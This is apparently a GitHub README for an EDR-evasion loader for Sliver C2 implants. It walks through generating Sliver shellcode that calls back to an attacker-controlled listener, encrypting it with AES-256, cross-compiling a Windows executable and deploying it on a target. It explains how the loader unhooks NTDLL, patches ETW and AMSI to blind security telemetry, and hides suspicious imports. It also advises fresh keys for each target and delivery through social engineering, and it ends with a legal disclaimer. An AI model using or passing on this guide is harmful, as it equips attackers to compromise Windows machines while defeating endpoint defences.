# Sliver AES-256 EDR Evasion Loader

Production-ready shellcode loader for Sliver C2 with AES-256 encryption, EDR evasion, and clean import obfuscation. Build on Kali Linux, deploy on Windows, defeat modern security solutions.

[![OPSEC](https://img.shields.io/badge/OPSEC-8.5%2F10-brightgreen)]()
[![ThreatCheck](https://img.shields.io/badge/ThreatCheck-Clean-success)]()
[![Platform](https://img.shields.io/badge/Platform-Windows%20x64-blue)]()
[![License](https://img.shields.io/badge/License-Educational-red)]()

---

## 🎯 Features

### Security
- ✅ **AES-256-CBC Encryption** - Military-grade shellcode protection
- ✅ **NTDLL Unhooking** - Removes EDR hooks from NTDLL memory
- ✅ **ETW Patching** - Disables Event Tracing for Windows telemetry
- ✅ **AMSI Patching** - Bypasses Windows Antimalware Scan Interface
- ✅ **Import Obfuscation** - Hides VirtualAlloc, CreateThread, VirtualFree via dynamic resolution
- ✅ **Self-Injection** - Reliable in-process shellcode execution

### Operational
- ✅ **Cross-Compilation** - Build on Kali, run on Windows
- ✅ **Single Executable** - No external dependencies
- ✅ **Clean Imports** - 8.5/10 OPSEC score, passes ThreatCheck
- ✅ **Production Tested** - Verified callbacks and functionality

---

## 📊 Import Analysis

### Standard Version (6/10 OPSEC)
```
VirtualAlloc      ❌ Suspicious
VirtualProtect    ❌ Suspicious
CreateThread      ❌ Suspicious
VirtualFree       ❌ Suspicious
```
Classic shellcode loader signature - easily fingerprinted.

### Stealth Version (8.5/10 OPSEC) ⭐ Recommended
```
GetModuleHandleA  ✅ Normal
GetProcAddress    ✅ Normal
LoadLibraryA      ✅ Normal
VirtualProtect    ⚠️ Common (minimal risk)

VirtualAlloc      ✅ HIDDEN
CreateThread      ✅ HIDDEN
VirtualFree       ✅ HIDDEN
```
Looks like legitimate application - hard to fingerprint.

---

## 📋 Prerequisites

### On Kali Linux

**System packages:**
```bash
sudo apt update
sudo apt install git mingw-w64 python3-venv
```

### On Sliver C2 Server

- Sliver framework installed
- Network connectivity from target to C2

---

## 🔧 Installation

### Step 1: Clone Repository

```bash
cd /opt
sudo git clone https://github.com/NEED-Programming/Sliver_Loader.git
sudo chmod 7777 Sliver_Loader
```

### Step 2: Set Up Python Environment

```bash
# Create virtual environment
python3 -m venv /opt/Sliver_Loader/venv

# Fix permissions
sudo chown -R $USER:$USER /opt/Sliver_Loader

# Activate environment
source /opt/Sliver_Loader/venv/bin/activate

# Install dependencies
pip install pycryptodome
```

**Important:** Always activate the virtual environment before building:
```bash
source /opt/Sliver_Loader/venv/bin/activate
```

---

## 🚀 Quick Start

### Step 1: Generate Sliver Shellcode

On your Sliver C2 server:

```bash
# Start Sliver
./sliver-server

# Start MTLS listener
sliver> mtls -L YOUR_IP -l 8888

# Verify listener
sliver> jobs

# Generate shellcode
sliver> generate --mtls YOUR_IP:8888 --os windows --arch amd64 --format shellcode --save /opt/Sliver_Loader/sliver.bin
```

**Example:**
```bash
sliver> mtls -L YOUR_IP -l 8888
sliver> generate --mtls YOUR_IP:8888 --os windows --arch amd64 --format shellcode --save /opt/Sliver_Loader/sliver.bin
```

### Step 2: Build Loader on Kali

```bash
# Navigate to directory
cd /opt/Sliver_Loader

# Activate virtual environment
source venv/bin/activate

# Make scripts executable (first time only)
chmod +x build_hybrid_stealth.sh encrypt_hybrid_stealth.py

# Build stealth version (recommended)
./build_hybrid_stealth.sh
```

**Output:**
```
✅ SUCCESS!
loader.exe (ready to deploy)
```

### Step 3: Deploy on Windows

Transfer `loader.exe` to Windows target and execute:

```cmd
loader.exe
```

### Step 4: Verify Callback

On Sliver server:

```bash
sliver> sessions

# Example output:
# ID  Name              Transport  Remote Address
# ==  ====              =========  ==============
# 1   CARING_MONKEY     mtls       YOUR_IP:54321

# Interact
sliver> use 1
sliver (CARING_MONKEY) > whoami
sliver (CARING_MONKEY) > pwd
```

---

## 📦 Files Included

| File | Description |
|------|-------------|
| **Stealth Version (Recommended)** ||
| `loader_edr_hybrid_stealth.cpp` | Loader with hidden imports (8.5/10 OPSEC) |
| `build_hybrid_stealth.sh` | Build script for stealth version |
| `encrypt_hybrid_stealth.py` | Encryption script for stealth version |
| **Standard Version (Baseline)** ||
| `loader_edr_hybrid.cpp` | Standard loader (6/10 OPSEC) |
| `build_hybrid.sh` | Build script for standard version |
| `encrypt_hybrid.py` | Encryption script for standard version |
| **Documentation** ||
| `README.md` | This file |

---

## 🎯 Which Version to Use?

### Use Stealth Version (Default) ⭐

**When:**
- Production red team engagements
- Target has modern EDR (Defender ATP, CrowdStrike, SentinelOne)
- Maximum OPSEC required
- Static analysis is a concern

**Build:**
```bash
./build_hybrid_stealth.sh
```

**OPSEC Score:** 8.5/10

---

### Use Standard Version

**When:**
- Testing/development
- Target has no/basic EDR
- Troubleshooting issues
- Baseline comparison

**Build:**
```bash
./build_hybrid.sh
```

**OPSEC Score:** 6/10

---

## 🔒 How It Works

### Build Process (On Kali)

1. **Read** raw Sliver shellcode from `sliver.bin`
2. **Generate** random 32-byte AES-256 key
3. **Generate** random 16-byte IV
4. **Encrypt** shellcode using AES-256-CBC
5. **Embed** encrypted shellcode + key into C++ source
6. **Compile** to Windows x64 executable

### Runtime Execution (On Windows)

1. **Unhook NTDLL** - Map clean NTDLL from disk, restore .text section
2. **Patch ETW** - Modify `EtwEventWrite` to return immediately (0xC3)
3. **Patch AMSI** - Modify `AmsiScanBuffer` to return error
4. **Decrypt** shellcode using embedded AES-256 key
5. **Resolve APIs** - Dynamically load VirtualAlloc, CreateThread, etc.
6. **Inject** shellcode via self-injection (or Early Bird APC if enabled)
7. **Execute** and callback to Sliver C2
8. **Cleanup** - Zero and free decrypted shellcode

---

## 🛡️ EDR Evasion Techniques

### NTDLL Unhooking

**Problem:** EDR hooks NTDLL functions to monitor API calls  
**Solution:** Map clean NTDLL from disk and restore original .text section

**How it works:**
1. Open `C:\Windows\System32\ntdll.dll` from disk
2. Map clean copy into memory
3. Find .text section (executable code)
4. Copy clean bytes over hooked in-memory version
5. EDR hooks removed

### ETW Patching

**Problem:** Event Tracing for Windows logs security events  
**Solution:** Patch `EtwEventWrite` to disable logging

**How it works:**
1. Locate `EtwEventWrite` in ntdll.dll
2. Change memory to RWX
3. Write `0xC3` (RET instruction)
4. Function returns immediately, no logging

### AMSI Patching

**Problem:** AMSI scans scripts and memory for malware  
**Solution:** Patch `AmsiScanBuffer` to always fail

**How it works:**
1. Load amsi.dll
2. Locate `AmsiScanBuffer`
3. Patch to return `E_INVALIDARG` (0x80070057)
4. AMSI disabled for this process

### Import Obfuscation (Stealth Version)

**Problem:** Import table reveals shellcode loader (VirtualAlloc + CreateThread)  
**Solution:** Dynamic API resolution at runtime

**How it works:**
```cpp
// Instead of static import:
VirtualAlloc(...);  // Shows in import table

// Use runtime resolution:
pVirtualAlloc fnVA = (pVirtualAlloc)GetProcAddress(
    GetModuleHandle("kernel32"), 
    "VirtualAlloc"
);
fnVA(...);  // Hidden from import table
```

**Result:** Clean import table, hard to fingerprint

### Self-Injection

**Why:** Most reliable shellcode execution method  
**How it works:**
1. Allocate RWX memory in current process
2. Copy decrypted shellcode to memory
3. Create thread pointing to shellcode
4. Wait for initialization
5. Shellcode callbacks to C2

---

## 🎛️ Advanced Usage

### Change Listener Type

Works with any Sliver listener:

**HTTPS:**
```bash
sliver> https --lport 443 --domain your-domain.com
sliver> generate --https your-domain.com --os windows --format shellcode --save sliver.bin
```

**DNS:**
```bash
sliver> dns --domains your-domain.com
sliver> generate --dns your-domain.com --os windows --format shellcode --save sliver.bin
```

Then rebuild:
```bash
./build_hybrid_stealth.sh
```

---

## 🔍 Verification

### Test Import Obfuscation

On Windows with Visual Studio installed:

```cmd
dumpbin /imports loader.exe > imports.txt
type imports.txt
```

**Stealth version should show:**
```
KERNEL32.dll:
  GetModuleHandleA  ✅
  GetProcAddress    ✅
  LoadLibraryA      ✅
  
  (NO VirtualAlloc, CreateThread, VirtualFree!)
```

### Test Static Detection

Using ThreatCheck:

```cmd
ThreatCheck.exe -f loader.exe
```

**Expected:** `[+] No threat found!`

### Test Callback

1. Start Sliver listener
2. Execute loader.exe on Windows
3. Check `sliver> sessions`
4. Should see new session

---

## 🔧 Troubleshooting

### No Callback Received

**Check Sliver listener:**
```bash
sliver> jobs
# Verify listener is running
```

**Check network connectivity:**
```cmd
ping YOUR_C2_IP
telnet YOUR_C2_IP 8888
```

**Check firewall:**
```bash
# On Sliver server
sudo ufw allow 8888/tcp
```

**Regenerate with correct IP:**
```bash
sliver> generate --mtls CORRECT_IP:8888 --os windows --format shellcode --save /opt/Sliver_Loader/sliver.bin
./build_hybrid_stealth.sh
```

### Build Errors

**Virtual environment not activated:**
```bash
source /opt/Sliver_Loader/venv/bin/activate
```

**Missing dependencies:**
```bash
pip install pycryptodome
sudo apt install mingw-w64
```

**Permission errors:**
```bash
sudo chown -R $USER:$USER /opt/Sliver_Loader
chmod +x build_hybrid_stealth.sh encrypt_hybrid_stealth.py
```

### Runtime Issues

**Loader crashes:**
- Try standard version first (./build_hybrid.sh)
- Check Windows version (requires Windows 7+)
- Run as Administrator

**Detection by AV:**
- Rebuild with fresh encryption key
- Test in isolated environment first
- Try different listener type (HTTPS vs MTLS)

---

## 📊 Technical Specifications

### Encryption
- **Algorithm:** AES-256-CBC
- **Key Size:** 256 bits (32 bytes, random)
- **IV:** 128 bits (16 bytes, random, prepended)
- **Padding:** PKCS#7

### Compilation
- **Compiler:** MinGW-w64 GCC
- **Target:** Windows x86-64
- **Optimization:** -O2
- **Linking:** Static
- **Strip:** Yes

### APIs Used
- **BCrypt:** AES decryption
- **Kernel32:** Memory, process, file operations
- **NTDLL:** Low-level system calls

### File Sizes
- **Source:** ~13KB (stealth), ~11KB (standard)
- **Compiled:** ~18-25KB (depends on shellcode size)

---

## ⚠️ OPSEC Considerations

### Strengths

✅ Clean import table (stealth version)  
✅ Defeats EDR userland hooks  
✅ Disables Windows telemetry  
✅ Bypasses AMSI scanning  
✅ Strong encryption (AES-256)  
✅ Single executable (no file drops)  
✅ Passes static analysis (ThreatCheck verified)  

### Limitations

⚠️ Behavioral detection still possible  
⚠️ Memory scanning can find shellcode  
⚠️ RWX memory allocation (some EDRs flag this)  
⚠️ NTDLL unhooking is a known technique  

### Best Practices

**For Maximum OPSEC:**
- Rebuild with fresh keys for each target
- Test against target's actual EDR in lab
- Use HTTPS listener for better blending
- Combine with social engineering delivery
- Code sign if possible (requires cert)
- Monitor for detection and adjust

**Deployment:**
1. Test with standard version first
2. Switch to stealth for production
3. Use Early Bird APC for extra evasion (if tested)
4. Document everything

---

## ⚖️ Legal & Ethical Use

**⚠️ CRITICAL WARNING ⚠️**

This tool is for **AUTHORIZED SECURITY TESTING ONLY**.

### Required Authorization

- ✅ **Written permission** from system owner
- ✅ **Defined scope** of engagement
- ✅ **Rules of engagement** documented
- ✅ **Incident response** plan in place
- ✅ **Legal review** completed

### Prohibited Use

- 🚫 Unauthorized access to any system
- 🚫 Deployment without explicit permission
- 🚫 Malicious intent of any kind
- 🚫 Testing on production without approval
- 🚫 Any illegal activity

### Legal Consequences

Unauthorized use violates:
- Computer Fraud and Abuse Act (CFAA)
- State and local computer crime laws
- International cybercrime treaties
- Employment agreements
- Professional ethics codes

**Penalties include:**
- Criminal prosecution
- Civil liability
- Job termination
- Professional sanctions
- Significant fines
- Prison time

**"I was just testing" is not a legal defense.**

### Acceptable Use

✅ Authorized penetration testing  
✅ Red team exercises with permission  
✅ Security research in isolated lab  
✅ Educational purposes (own systems only)  
✅ Defensive security training  

**Get authorization. Document everything. Stay legal.**

---

## 📄 License

This tool is provided for educational and authorized security testing purposes only.

**NO WARRANTY** - Provided "as-is" without warranty of any kind.

By using this tool, you agree to:
- Use only for lawful, authorized purposes
- Accept full responsibility for your actions
- Comply with all applicable laws
- Not hold the authors liable for misuse

---

## 🙏 Credits

**Technologies:**
- **Sliver C2** - BishopFox (https://github.com/BishopFox/sliver)
- **MinGW-w64** - Cross-compilation toolchain
- **PyCryptodome** - Python cryptography library

**EDR Evasion Research:**
- NTDLL Unhooking - "Perun's Fart" technique
- ETW Patching - Adam Chester (@_xpn_)
- AMSI Bypass - Various security researchers
- Early Bird APC - Maldev Academy
- Import Obfuscation - Dynamic resolution techniques

**Special Thanks:**
- Security research community
- Malware development educators
- Red team practitioners

---

## 📞 Support

### Issues

For problems with:
- **Sliver C2:** https://github.com/BishopFox/sliver/wiki
- **Build errors:** Check Troubleshooting section
- **Compilation:** Verify Prerequisites section

### Community

- Follow responsible disclosure
- Share improvements (if authorized)
- Document your findings
- Help others learn

---

## 🔄 Version History

**v2.0** - Stealth Release (Current)
- Added import obfuscation (8.5/10 OPSEC)
- Dynamic API resolution
- Hidden VirtualAlloc, CreateThread, VirtualFree
- Verified with ThreatCheck
- Production tested with callbacks

**v1.0** - Initial Release
- AES-256-CBC encryption
- NTDLL unhooking
- ETW patching
- AMSI patching
- Dual injection methods
- Kali cross-compilation

---

## 📈 Roadmap

Potential future improvements:
- [ ] Full syscall implementation
- [ ] Additional injection techniques
- [ ] String obfuscation
- [ ] Control flow obfuscation
- [ ] Additional anti-analysis checks
- [ ] Module stomping support

**Contributions welcome (for authorized testing only).**

---

**Built for security professionals. Used responsibly. Stay legal, stay ethical.** 🎯

---

*Last Updated: February 2026*
